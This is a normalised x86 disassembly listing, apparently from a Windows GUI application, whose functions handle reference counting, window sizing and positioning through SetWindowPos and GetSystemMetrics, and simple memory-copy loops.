push ecx
mov [ esp + 0x2c ] esp
mov ecx esp
je r-xdata
inc [ eax + 0xd48 ]
mov [ ecx ] eax
push 0x1
lea ecx [ esp + 0x2c ]
push ecx
lea edx [ esp + 0x34 ]
push edx
lea eax [ esp + 0x3c ]
push eax
lea ecx [ esp + 0x44 ]
push ecx
call sub_45ddb0
mov ebp [ esp + 0x40 ]
xor bl bl
add esp 0x20
cmp ebp esi
mov [ rw-data ] bl
mov [ rw-data ] bl
jle r-xdata
inc [ eax + 0xd48 ]
mov eax [ esp + 0x10 ]
cmp [ esp + 0x1c ] eax
jle r-xdata
mov edx [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x1c ]
sub edx ecx
cmp eax edx
mov bl 0x1
mov [ rw-data ] bl
jle r-xdata
mov ecx [ rw-data ]
xor edx edx
cmp ecx edx
jge r-xdata
mov edx [ esp + 0x14 ]
mov ecx esi
sub ecx edx
cmp ebp ecx
mov [ rw-data ] 0x1
jle r-xdata
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x18 ]
sub eax edx
mov [ esp + 0x10 ] eax
mov [ rw-data ] bl
jmp r-xdata
mov eax ebp
sub eax esi
cmp ecx eax
jle r-xdata
xor ecx ecx
mov [ rw-data ] ecx
sub esi [ esp + 0x14 ]
test bl bl
je r-xdata
mov bl 0x1
mov [ rw-data ] bl
cmp ecx edx
jge r-xdata
mov ecx eax
mov [ rw-data ] ecx
mov ecx [ rw-data ]
cmp ecx edx
jge r-xdata
mov [ rw-data ] edx
mov eax [ esp + 0x1c ]
sub eax [ esp + 0x10 ]
cmp ecx eax
jle r-xdata
xor ecx ecx
mov [ rw-data ] ecx
cmp ecx edx
jge r-xdata
mov ecx eax
mov [ rw-data ] ecx
mov edi [ esp + 0x40 ]
test edi edi
mov edx 0x7
je r-xdata
mov [ rw-data ] edx
mov edi [ esp + 0x44 ]
test edi edi
je r-xdata
test bl bl
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x2c
retn
mov al [ rw-data ]
test al al
je r-xdata
mov ecx edx
xor eax eax
[ edi ]
dec ebp
mov [ edi ] 0x1c
mov [ edi + 0x4 ] edx
mov [ edi + 0x8 ] 0x0
mov [ edi + 0xc ] ebp
mov [ edi + 0x10 ] esi
mov eax [ rw-data ]
mov [ edi + 0x14 ] eax
jmp r-xdata
mov ecx edx
xor eax eax
[ edi ]
mov ecx [ esp + 0x1c ]
mov [ edi + 0x4 ] edx
mov edx [ esp + 0x10 ]
dec ecx
mov [ edi ] 0x1c
mov [ edi + 0x8 ] 0x0
mov [ edi + 0xc ] ecx
mov [ edi + 0x10 ] edx
mov eax [ rw-data ]
mov [ edi + 0x14 ] eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x2c
retn
sub_45e630
push 0xffffffff
push sub_4c09d0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov esi [ esp + 0x38 ]
test esi esi
mov [ esp + 0x30 ] 0x1
jne r-xdata
lea ecx [ esp + 0x10 ]
push ecx
lea edx [ esp + 0x1c ]
push edx
call sub_45bab0
mov eax [ rw-data ]
add esp 0x8
push eax
mov eax [ rw-data ]
test eax eax
push ecx
mov [ esp + 0x28 ] esp
mov ecx esp
je r-xdata
mov eax [ rw-data ]
push esi
push esi
push eax
call [ InvalidateRect@IAT ]
mov esi [ esp + 0x3c ]
test esi esi
mov [ esp + 0x30 ] 0xffffffff
je r-xdata
mov [ ecx ] eax
mov eax [ rw-data ]
test eax eax
push ecx
mov [ esp + 0x2c ] esp
mov ecx esp
je r-xdata
inc [ eax + 0xd48 ]
fld [ r--data ]
mov ecx [ esp + 0x28 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
add esp 0x28
retn
dec [ esi + 0xd48 ]
jne r-xdata
mov [ ecx ] eax
push 0x1
lea ecx [ esp + 0x30 ]
push ecx
lea edx [ esp + 0x30 ]
push edx
lea eax [ esp + 0x2c ]
push eax
lea ecx [ esp + 0x28 ]
push ecx
call sub_45ddb0
mov edx [ esp + 0x34 ]
mov ebx [ esp + 0x38 ]
mov eax [ esp + 0x2c ]
imul edx ebx
imul eax [ esp + 0x30 ]
mov edi [ esp + 0x5c ]
add esp 0x20
cmp edx eax
jle r-xdata
inc [ eax + 0xd48 ]
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
fild [ esp + 0x18 ]
mov eax [ rw-data ]
cmp eax 0x2
fstp [ esp + 0x18 ]
fild [ esp + 0xc ]
fdivr [ esp + 0x18 ]
fstp [ esp + 0x10 ]
jne r-xdata
fild [ esp + 0x10 ]
fidiv [ esp + 0x14 ]
jmp r-xdata
mov eax [ esi + 0xd48 ]
dec eax
mov [ esp + 0x30 ] 0x0
mov [ esi + 0xd48 ] eax
jne r-xdata
test edi edi
mov ecx [ esp + 0x10 ]
push ecx
push ecx
mov [ esp + 0x2c ] esp
mov eax esp
je r-xdata
fstp [ esp + 0x10 ]
test edi edi
mov [ esp + 0x30 ] 0xffffffff
je r-xdata
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
mov [ eax ] edi
mov edx [ esi + 0xd48 ]
push ecx
mov eax esp
inc edx
mov [ esp + 0x30 ] esp
mov [ esi + 0xd48 ] edx
push 0x1
lea edx [ esp + 0x30 ]
push edx
mov [ eax ] esi
lea eax [ esp + 0x30 ]
push eax
lea ecx [ esp + 0x2c ]
push ecx
lea edx [ esp + 0x28 ]
push edx
call sub_45ddb0
mov eax [ esp + 0x3c ]
add esp 0x20
cmp eax ebx
jle r-xdata
inc [ edi + 0xd48 ]
mov ecx [ esp + 0x28 ]
fld [ esp + 0x10 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x28
retn
dec [ edi + 0xd48 ]
jne r-xdata
mov eax [ esp + 0xc ]
inc eax
mov [ esp + 0x38 ] eax
fild [ esp + 0x38 ]
fdivr [ esp + 0x18 ]
mov ecx edi
call sub_43fe30
push edi
call j_sub_4b66ed#2
add esp 0x4
sub_45e820
push 0xffffffff
push sub_4c09b0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x2c
push ebx
push ebp
push esi
push edi
mov esi [ esp + 0x50 ]
xor edi edi
cmp esi edi
mov [ esp + 0x44 ] 0x1
jne r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
mov eax [ rw-data ]
push edi
push edi
push eax
call [ InvalidateRect@IAT ]
mov esi [ esp + 0x54 ]
cmp esi edi
mov [ esp + 0x44 ] 0xffffffff
je r-xdata
mov eax [ esi + 0xd48 ]
dec eax
mov [ esp + 0x44 ] 0x0
mov [ esi + 0xd48 ] eax
jne r-xdata
mov al [ esp + 0x4c ]
test al al
je r-xdata
fld [ r--data ]
mov ecx [ esp + 0x3c ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x38
retn
dec [ esi + 0xd48 ]
jne r-xdata
mov esi [ esp + 0x54 ]
test esi esi
mov [ esp + 0x44 ] 0xffffffff
je r-xdata
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
cmp [ rw-data ] edi
jne r-xdata
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
mov ecx [ esp + 0x3c ]
fld [ r--data ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x38
retn
dec [ esi + 0xd48 ]
jne r-xdata
push 0x3f800000
push ecx
mov ecx [ esp + 0x5c ]
cmp ecx edi
mov [ esp + 0x30 ] esp
mov eax esp
je r-xdata
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
push ecx
mov [ eax ] ecx
mov ecx [ esi + 0xd48 ]
mov eax esp
mov [ esp + 0x34 ] esp
inc ecx
mov [ esi + 0xd48 ] ecx
push 0x1
lea ecx [ esp + 0x34 ]
push ecx
lea edx [ esp + 0x30 ]
mov [ eax ] esi
push edx
lea eax [ esp + 0x38 ]
push eax
lea ecx [ esp + 0x44 ]
push ecx
call sub_45ddb0
mov eax [ rw-data ]
add esp 0x20
cmp eax edi
mov [ esp + 0x1c ] edi
mov [ esp + 0x18 ] edi
jne r-xdata
inc [ ecx + 0xd48 ]
mov edi [ GetSystemMetrics@IAT ]
push 0x2
call edi
push 0x3
mov [ esp + 0x20 ] eax
call edi
mov [ esp + 0x18 ] eax
jmp r-xdata
cmp [ rw-data ] edi
je r-xdata
lea edx [ esp + 0x24 ]
push edx
lea eax [ esp + 0x18 ]
push eax
call sub_45bab0
mov ecx [ rw-data ]
mov eax [ rw-data ]
add esp 0x8
cmp ecx eax
jne r-xdata
mov edi [ GetSystemMetrics@IAT ]
push 0x20
call edi
mov esi eax
push 0x21
shl esi 0x1
call edi
push 0x4
mov ebx eax
call edi
lea edx [ eax + ebx * 2 ]
mov [ esp + 0x14 ] edx
lea edx [ esp + 0x2c ]
push edx
call sub_451530
add esp 0x4
push 0x20
call edi
mov ebp [ esp + 0x14 ]
mov ebx [ esp + 0x34 ]
shl eax 0x1
mov esi eax
sub esi [ esp + 0x2c ]
sub esi ebp
push 0x21
add esi ebx
call edi
mov ebp [ esp + 0x24 ]
shl eax 0x1
mov ebx eax
sub ebx [ esp + 0x30 ]
push 0xf
sub ebx ebp
call edi
push 0x4
add ebx eax
call edi
mov ecx [ esp + 0x38 ]
add ecx ebx
add eax ecx
mov cl [ rw-data ]
test cl cl
mov [ esp + 0x14 ] eax
je r-xdata
cmp esi ebp
jle r-xdata
add esi [ esp + 0x18 ]
cmp esi ebp
mov edi ebx
jle r-xdata
push 0x3d
call edi
push 0x3e
mov ebx eax
call edi
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x20 ]
mov ebp eax
mov eax [ esp + 0x28 ]
lea edi [ esi + eax ]
cmp edi ebx
lea esi [ ecx + edx ]
jle r-xdata
add eax 0x14
mov [ esp + 0x14 ] eax
jmp r-xdata
mov ecx [ rw-data ]
cmp ecx [ rw-data ]
jne r-xdata
add edi [ esp + 0x1c ]
cmp edi ebx
mov esi ebp
jle r-xdata
mov esi ebp
jmp r-xdata
mov eax ebp
sub eax esi
cdq
sub eax edx
push 0x62
sar eax 0x1
push esi
sub eax 0x4
push edi
push eax
mov eax ebx
sub eax edi
cdq
sub eax edx
sar eax 0x1
push eax
push 0xfffffffe
push ecx
call [ SetWindowPos@IAT ]
mov ecx [ rw-data ]
push 0x0
push 0x0
push 0x232
push ecx
call [ SendMessageA@IAT ]
mov al [ rw-data ]
test al al
jne r-xdata
mov edi ebx
mov esi [ esp + 0x50 ]
mov eax ebx
sub eax edi
cdq
sub eax edx
mov ebx eax
mov [ esp + 0x13 ] 0x1
sar ebx 0x1
mov [ esp + 0x13 ] 0x0
push 0xf
call [ GetSystemMetrics@IAT ]
lea esi [ esi + eax - 0x1 ]
jmp r-xdata
mov esi ebp
mov al [ esp + 0x13 ]
test al al
jne r-xdata
cmp esi ebp
jg r-xdata
mov eax ebp
sub eax esi
cdq
push 0x22
push esi
sub eax edx
push edi
sar eax 0x1
sub eax 0x4
push eax
mov eax [ rw-data ]
push ebx
push 0xfffffffe
push eax
mov [ rw-data ] 0x3
call [ SetWindowPos@IAT ]
mov edx [ rw-data ]
lea ecx [ esp + 0x2c ]
push ecx
push edx
call [ GetWindowRect@IAT ]
mov eax [ esp + 0x38 ]
mov edx [ esp + 0x30 ]
mov ecx [ esp + 0x20 ]
sub eax edx
cmp eax ecx
jge r-xdata
jmp r-xdata
mov eax ebp
sub eax esi
cdq
push 0x62
push esi
sub eax edx
push edi
sar eax 0x1
sub eax 0x4
push eax
mov eax [ rw-data ]
push ebx
push 0xfffffffe
push eax
call [ SetWindowPos@IAT ]
mov [ rw-data ] 0x0
jmp r-xdata
sub_45eba0
push 0xffffffff
push sub_4c09d0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
push esi
mov esi [ esp + 0x24 ]
test esi esi
mov [ esp + 0x1c ] 0x1
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
push esi
push esi
push eax
call [ InvalidateRect@IAT ]
mov esi [ esp + 0x28 ]
test esi esi
mov [ esp + 0x1c ] 0xffffffff
je r-xdata
mov [ esp + 0x24 ] 0x3f800000
mov eax [ rw-data ]
test eax eax
je r-xdata
fld [ r--data ]
mov ecx [ esp + 0x14 ]
mov [ fs : 0x0 ] ecx
pop esi
add esp 0x1c
retn
dec [ esi + 0xd48 ]
jne r-xdata
mov esi [ esp + 0x28 ]
test esi esi
mov [ esp + 0x1c ] 0xffffffff
je r-xdata
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
mov eax [ rw-data ]
test eax eax
je r-xdata
fild [ rw-data ]
fmul [ r--data ]
fstp [ esp + 0x24 ]
jmp r-xdata
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
mov ecx [ esp + 0x14 ]
fld [ esp + 0x24 ]
mov [ fs : 0x0 ] ecx
pop esi
add esp 0x1c
retn
dec [ esi + 0xd48 ]
jne r-xdata
call sub_40af00
xor edx edx
mov dl [ rw-data ]
push eax
mov ecx esi
push edx
call sub_4440b0
mov [ esp + 0x4 ] eax
call sub_40af00
push eax
xor eax eax
mov al [ rw-data ]
mov ecx esi
push eax
call sub_444100
mov [ esp + 0x8 ] eax
mov eax [ rw-data ]
test eax eax
push 0x3f800000
push ecx
mov [ esp + 0x10 ] esp
mov ecx esp
je r-xdata
mov eax [ esi + 0xd48 ]
dec eax
mov [ esp + 0x1c ] 0x0
mov [ esi + 0xd48 ] eax
jne r-xdata
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
mov eax [ rw-data ]
test eax eax
je r-xdata
fild [ rw-data ]
fidiv [ esp + 0x4 ]
fstp [ esp + 0x24 ]
mov [ ecx ] eax
mov eax [ rw-data ]
test eax eax
push ecx
mov [ esp + 0x14 ] esp
mov ecx esp
je r-xdata
inc [ eax + 0xd48 ]
fild [ rw-data ]
fidiv [ esp + 0x8 ]
fstp [ esp + 0x24 ]
jmp r-xdata
mov [ ecx ] eax
push 0x1
lea ecx [ esp + 0x1c ]
push ecx
lea edx [ esp + 0x24 ]
push edx
lea eax [ esp + 0x20 ]
push eax
lea ecx [ esp + 0x20 ]
push ecx
call sub_45ddb0
add esp 0x20
jmp r-xdata
inc [ eax + 0xd48 ]
mov eax [ rw-data ]
test eax eax
je r-xdata
sub_45ed70
push 0xffffffff
push sub_4c09d0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov esi [ esp + 0x38 ]
test esi esi
mov [ esp + 0x30 ] 0x1
jne r-xdata
lea ecx [ esp + 0x10 ]
push ecx
lea edx [ esp + 0x18 ]
push edx
call sub_45bab0
fild [ esp + 0x18 ]
add esp 0x8
fstp [ esp + 0x10 ]
call sub_40af00
push eax
xor eax eax
mov al [ rw-data ]
mov ecx esi
push eax
call sub_444100
test eax eax
mov [ esp + 0x20 ] eax
fild [ esp + 0x20 ]
jge r-xdata
mov eax [ rw-data ]
push esi
push esi
push eax
call [ InvalidateRect@IAT ]
mov esi [ esp + 0x3c ]
test esi esi
mov [ esp + 0x30 ] 0xffffffff
je r-xdata
fdivr [ esp + 0x10 ]
mov edi [ esp + 0x3c ]
test edi edi
fstp [ esp + 0xc ]
mov ecx [ esp + 0xc ]
push ecx
push ecx
mov [ esp + 0x28 ] esp
mov eax esp
je r-xdata
fadd [ r--data ]
fld [ r--data ]
mov ecx [ esp + 0x28 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
add esp 0x28
retn
dec [ esi + 0xd48 ]
jne r-xdata
push ecx
mov [ eax ] edi
mov ecx [ esi + 0xd48 ]
mov eax esp
mov [ esp + 0x2c ] esp
inc ecx
push 0x1
mov [ esi + 0xd48 ] ecx
lea edx [ esp + 0x28 ]
push edx
mov [ eax ] esi
lea eax [ esp + 0x24 ]
push eax
lea ecx [ esp + 0x34 ]
push ecx
lea edx [ esp + 0x3c ]
push edx
call sub_45ddb0
mov ebx [ esp + 0x34 ]
mov eax [ esp + 0x30 ]
add esp 0x20
cmp eax ebx
jle r-xdata
inc [ edi + 0xd48 ]
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
mov eax [ esi + 0xd48 ]
dec eax
mov [ esp + 0x30 ] 0x0
mov [ esi + 0xd48 ] eax
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
test edi edi
mov [ esp + 0x30 ] 0xffffffff
je r-xdata
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
test edi edi
fild [ esp + 0x14 ]
fstp [ esp + 0x14 ]
fild [ esp + 0x10 ]
fdivr [ esp + 0x14 ]
fmul [ esp + 0xc ]
fstp [ esp + 0xc ]
mov eax [ esp + 0xc ]
push eax
push ecx
mov [ esp + 0x2c ] esp
mov eax esp
je r-xdata
mov ecx [ esp + 0x28 ]
fld [ esp + 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x28
retn
dec [ edi + 0xd48 ]
jne r-xdata
push ecx
mov [ eax ] edi
mov ecx [ esi + 0xd48 ]
mov eax esp
inc ecx
mov [ esp + 0x30 ] esp
mov [ esi + 0xd48 ] ecx
push 0x1
lea ecx [ esp + 0x28 ]
push ecx
lea edx [ esp + 0x24 ]
mov [ eax ] esi
push edx
lea eax [ esp + 0x34 ]
push eax
lea ecx [ esp + 0x3c ]
push ecx
call sub_45ddb0
mov eax [ esp + 0x30 ]
add esp 0x20
cmp eax ebx
jle r-xdata
inc [ edi + 0xd48 ]
mov ecx edi
call sub_43fe30
push edi
call j_sub_4b66ed#2
add esp 0x4
fild [ esp + 0x10 ]
fdivr [ esp + 0x14 ]
fmul [ esp + 0xc ]
fstp [ esp + 0xc ]
sub_45ef80
push 0xffffffff
push sub_4c09d0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push ebx
push ebp
push esi
push edi
lea eax [ esp + 0x1c ]
push eax
lea ecx [ esp + 0x18 ]
push ecx
mov [ esp + 0x38 ] 0x1
call sub_45bab0
mov edi [ esp + 0x44 ]
add esp 0x8
push 0x3f800000
push ecx
xor ebx ebx
cmp edi ebx
mov [ esp + 0x20 ] esp
mov eax esp
je r-xdata
mov esi [ esp + 0x40 ]
cmp esi ebx
push ecx
mov [ eax ] edi
mov [ esp + 0x24 ] esp
mov eax esp
je r-xdata
inc [ edi + 0xd48 ]
push 0x1
lea edx [ esp + 0x28 ]
push edx
mov [ eax ] esi
lea eax [ esp + 0x24 ]
push eax
lea ecx [ esp + 0x38 ]
push ecx
lea edx [ esp + 0x40 ]
push edx
call sub_45ddb0
mov eax [ rw-data ]
add esp 0x20
cmp eax 0x1
jne r-xdata
inc [ esi + 0xd48 ]
cmp eax 0x2
je r-xdata
mov eax [ esp + 0x10 ]
cmp eax [ esp + 0x14 ]
jle r-xdata
mov edx [ esp + 0x10 ]
cmp edx [ esp + 0x14 ]
jg r-xdata
cmp eax 0x6
jne r-xdata
cmp esi ebx
mov [ esp + 0x30 ] bl
je r-xdata
mov ecx [ esp + 0x18 ]
cmp ecx [ esp + 0x1c ]
jle r-xdata
cmp esi ebx
mov ebp eax
mov [ esp + 0x30 ] bl
je r-xdata
mov ecx [ esp + 0x18 ]
cmp ecx [ esp + 0x1c ]
jg r-xdata
cmp eax 0x4
je r-xdata
cmp edi ebx
mov [ esp + 0x30 ] 0xffffffff
je r-xdata
dec [ esi + 0xd48 ]
jne r-xdata
cmp esi ebx
mov [ esp + 0x30 ] bl
je r-xdata
cmp edi ebx
mov [ esp + 0x30 ] 0xffffffff
je r-xdata
dec [ esi + 0xd48 ]
jne r-xdata
cmp eax 0x5
je r-xdata
mov eax 0x3
mov ecx [ esp + 0x28 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x24
retn
dec [ edi + 0xd48 ]
jne r-xdata
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
cmp edi ebx
mov [ esp + 0x30 ] 0xffffffff
je r-xdata
dec [ esi + 0xd48 ]
jne r-xdata
mov ecx [ esp + 0x28 ]
pop edi
pop esi
mov eax ebp
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x24
retn
dec [ edi + 0xd48 ]
jne r-xdata
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
mov ecx edi
call sub_43fe30
push edi
call j_sub_4b66ed#2
add esp 0x4
mov eax 0x1
mov ecx [ esp + 0x28 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x24
retn
dec [ edi + 0xd48 ]
jne r-xdata
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
mov ecx edi
call sub_43fe30
push edi
call j_sub_4b66ed#2
add esp 0x4
mov ecx edi
call sub_43fe30
push edi
call j_sub_4b66ed#2
add esp 0x4
sub_45f170
test [ rw-data ] 0xf
je r-xdata
mov eax 0x1
retn
mov al [ rw-data ]
test al al
jne r-xdata
mov eax [ rw-data ]
mov [ rw-data ] 0x1b
mov [ rw-data ] eax
mov [ rw-data ] 0x0
xor eax eax
retn
sub_45f1b0
mov eax [ ecx ]
mov dl [ eax + 0x89 ]
test dl dl
jne r-xdata
retn
mov edx [ eax + 0x8 ]
push ebx
mov bl [ edx + 0x89 ]
test bl bl
jne r-xdata
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x89 ]
test dl dl
jne r-xdata
mov eax [ edx ]
mov bl [ eax + 0x89 ]
test bl bl
jne r-xdata
mov [ ecx ] eax
pop ebx
mov edx [ ecx ]
cmp edx [ eax + 0x8 ]
jne r-xdata
mov [ ecx ] edx
pop ebx
retn
mov edx eax
mov eax [ edx ]
mov bl [ eax + 0x89 ]
test bl bl
je r-xdata
mov [ ecx ] eax
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x89 ]
test dl dl
je r-xdata
sub_45f210
mov eax [ ecx ]
mov dl [ eax + 0x89 ]
test dl dl
je r-xdata
mov edx [ eax ]
push ebx
mov bl [ edx + 0x89 ]
test bl bl
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ecx ] eax
retn
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x89 ]
test dl dl
jne r-xdata
mov eax [ edx + 0x8 ]
mov bl [ eax + 0x89 ]
test bl bl
jne r-xdata
pop ebx
retn
mov edx [ ecx ]
cmp edx [ eax ]
jne r-xdata
mov [ ecx ] edx
pop ebx
retn
lea esp [ esp ]
mov dl [ eax + 0x89 ]
test dl dl
jne r-xdata
mov [ ecx ] eax
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x89 ]
test dl dl
je r-xdata
mov edx eax
mov eax [ edx + 0x8 ]
mov bl [ eax + 0x89 ]
test bl bl
je r-xdata
mov [ ecx ] eax
sub_45f290
mov eax [ ecx ]
mov dl [ eax + 0x15 ]
test dl dl
je r-xdata
mov edx [ eax ]
push ebx
mov bl [ edx + 0x15 ]
test bl bl
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ecx ] eax
retn
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x15 ]
test dl dl
jne r-xdata
mov eax [ edx + 0x8 ]
mov bl [ eax + 0x15 ]
test bl bl
jne r-xdata
pop ebx
retn
lea ecx [ ecx ]
mov [ ecx ] edx
pop ebx
retn
mov edx eax
mov eax [ edx + 0x8 ]
mov bl [ eax + 0x15 ]
test bl bl
je r-xdata
mov dl [ eax + 0x15 ]
test dl dl
jne r-xdata
mov [ ecx ] eax
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x15 ]
test dl dl
je r-xdata
mov [ ecx ] eax
mov edx [ ecx ]
cmp edx [ eax ]
jne r-xdata
sub_45f2f0
push ebp
mov ebp [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
cmp esi ebp
je r-xdata
pop esi
pop ebp
retn
push ebx
push edi
mov edi [ esi ]
test edi edi
je r-xdata
inc [ ebx + 0xd48 ]
mov [ esi ] ebx
add esi 0x4
cmp esi ebp
jne r-xdata
dec [ edi + 0xd48 ]
jne r-xdata
mov eax [ esp + 0x1c ]
mov ebx [ eax ]
test ebx ebx
je r-xdata
pop edi
pop ebx
mov ecx edi
call sub_43fe30
push edi
call j_sub_4b66ed#2
add esp 0x4
sub_45f340
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
cmp eax edx
je r-xdata
retn
push ebx
mov ebx [ esp + 0x10 ]
push esi
push edi
mov edi eax
add eax 0xdc
cmp eax edx
mov ecx 0x37
mov esi ebx
[ edi ] [ esi ]
jne r-xdata
pop edi
pop esi
pop ebx
sub_45f370
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
cmp eax edx
je r-xdata
retn
push ebx
mov ebx [ esp + 0x10 ]
push esi
push edi
mov edi eax
add eax 0x1a0
cmp eax edx
mov ecx 0x68
mov esi ebx
[ edi ] [ esi ]
jne r-xdata
pop edi
pop esi
pop ebx
sub_45f3a0
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
cmp eax ecx
je r-xdata
retn
push esi
mov esi [ esp + 0x10 ]
mov dl [ esi ]
mov [ eax ] dl
inc eax
cmp eax ecx
jne r-xdata
pop esi
sub_45f3c0
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
cmp eax edx
je r-xdata
retn
push ebx
mov ebx [ esp + 0x10 ]
push esi
push edi
mov edi eax
add eax 0x14
cmp eax edx
mov ecx 0x5
mov esi ebx
[ edi ] [ esi ]
jne r-xdata
pop edi
pop esi
pop ebx
sub_45f3f0
mov eax [ esp + 0x8 ]
push ebx
mov ebx [ esp + 0x8 ]
cmp ebx eax
je r-xdata
mov eax [ esp + 0x10 ]
pop ebx
retn
push ebp
push esi
mov esi [ esp + 0x18 ]
push edi
mov ebp [ esi ]
test ebp ebp
je r-xdata
inc [ edi + 0xd48 ]
mov eax [ esp + 0x18 ]
mov [ esi ] edi
add ebx 0x4
add esi 0x4
cmp ebx eax
jne r-xdata
dec [ ebp + 0xd48 ]
jne r-xdata
mov edi [ ebx ]
test edi edi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
retn
mov ecx ebp
call sub_43fe30
push ebp
call j_sub_4b66ed#2
add esp 0x4
sub_45f450
mov eax [ esp + 0x8 ]
push ebx
mov ebx [ esp + 0x10 ]
cmp eax ebx
je r-xdata
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x14 ]
mov [ eax ] ecx
pop ebx
retn
push ebp
push esi
push edi
mov edi [ esp + 0x20 ]
mov ebp [ edi ]
test ebp ebp
je r-xdata
inc [ esi + 0xd48 ]
cmp ebx [ esp + 0x18 ]
mov [ edi ] esi
jne r-xdata
dec [ ebp + 0xd48 ]
jne r-xdata
mov esi [ ebx - 0x4 ]
sub ebx 0x4
sub edi 0x4
test esi esi
je r-xdata
mov eax [ esp + 0x14 ]
mov [ eax ] edi
pop edi
pop esi
pop ebp
pop ebx
retn
mov ecx ebp
call sub_43fe30
push ebp
call j_sub_4b66ed#2
add esp 0x4
sub_45f4c0
mov edx [ esp + 0x8 ]
mov eax [ esp + 0xc ]
cmp edx eax
mov ecx [ esp + 0x10 ]
je r-xdata
mov eax [ esp + 0x4 ]
mov [ eax ] ecx
retn
push ebx
push esi
push edi
sub eax 0xc
sub ecx 0xc
cmp eax edx
mov esi eax
mov ebx [ esi ]
mov edi ecx
mov [ edi ] ebx
mov ebx [ esi + 0x4 ]
mov [ edi + 0x4 ] ebx
mov esi [ esi + 0x8 ]
mov [ edi + 0x8 ] esi
jne r-xdata
pop edi
pop esi
pop ebx
sub_45f500
mov eax [ esp + 0xc ]
push ebx
mov ebx [ esp + 0xc ]
cmp ebx eax
je r-xdata
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x14 ]
mov [ eax ] ecx
pop ebx
retn
mov edx [ esp + 0x14 ]
push esi
push edi
sub eax 0xdc
sub edx 0xdc
cmp eax ebx
mov ecx 0x37
mov esi eax
mov edi edx
[ edi ] [ esi ]
jne r-xdata
mov eax [ esp + 0x10 ]
pop edi
pop esi
mov [ eax ] edx
pop ebx
retn
sub_45f550
mov eax [ esp + 0xc ]
push ebx
mov ebx [ esp + 0xc ]
cmp ebx eax
je r-xdata
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x14 ]
mov [ eax ] ecx
pop ebx
retn
mov edx [ esp + 0x14 ]
push esi
push edi
sub eax 0x1a0
sub edx 0x1a0
cmp eax ebx
mov ecx 0x68
mov esi eax
mov edi edx
[ edi ] [ esi ]
jne r-xdata
mov eax [ esp + 0x10 ]
pop edi
pop esi
mov [ eax ] edx
pop ebx
retn
sub_45f5a0
mov eax [ esp + 0xc ]
push ebx
mov ebx [ esp + 0xc ]
cmp ebx eax
je r-xdata
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x14 ]
mov [ eax ] ecx
pop ebx
retn
mov edx [ esp + 0x14 ]
push esi
push edi
sub eax 0x14
sub edx 0x14
cmp eax ebx
mov ecx 0x5
mov esi eax
mov edi edx
[ edi ] [ esi ]
jne r-xdata
mov eax [ esp + 0x10 ]
pop edi
pop esi
mov [ eax ] edx
pop ebx
retn
sub_45f5e0
mov ecx [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
cmp ecx edx
mov eax [ esp + 0xc ]
je r-xdata
retn
